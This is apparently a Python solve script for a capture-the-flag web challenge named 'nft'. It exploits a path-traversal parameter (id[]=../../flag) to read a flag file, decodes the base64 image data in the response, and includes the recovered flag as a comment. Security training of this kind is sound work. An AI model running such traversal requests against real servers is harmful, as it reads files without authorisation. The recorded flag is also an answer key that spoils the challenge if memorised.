import requests
import re
import base64

site = "http://nft.challs.olicyber.it"

r = requests.get(f"{site}/nft?id[]=../../flag").text
m = re.search(r'data:image\/[a-zA-Z0-9.+-]+;base64,\s*([A-Za-z0-9+/=]+)', r) # regex x flag
b64 = m.group(1)
flag = base64.b64decode(b64).decode('utf-8', errors='replace')
print(flag)


#flag{N0n_fUng1bl3_p4th}